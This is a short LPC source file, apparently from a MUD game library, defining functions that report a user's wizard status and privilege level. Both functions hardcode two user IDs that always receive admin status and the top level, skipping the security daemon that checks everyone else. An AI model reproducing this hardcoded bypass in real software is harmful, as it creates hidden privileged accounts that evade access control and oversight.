// wiz.c

string wizhood(mixed ob)
{
 if( objectp(ob) ) {
	if( getuid(ob)=="yxm" || getuid(ob)=="bmw" )
	return "(admin)";
   }
  if( stringp(ob) ) {
	if( ob=="yxm" || ob=="bmw" )
  	return "(admin)";
   }
	return SECURITY_D->get_status(ob);
}

int wiz_level(mixed ob)
{
 if( objectp(ob) ) {
	if( getuid(ob)=="yxm" || getuid(ob)=="bmw" )
	return 6;
   }
  if( stringp(ob) ) {
	if( ob=="yxm" || ob=="bmw" )
  	return 6;
   }	
	return SECURITY_D->get_wiz_level(ob);
}

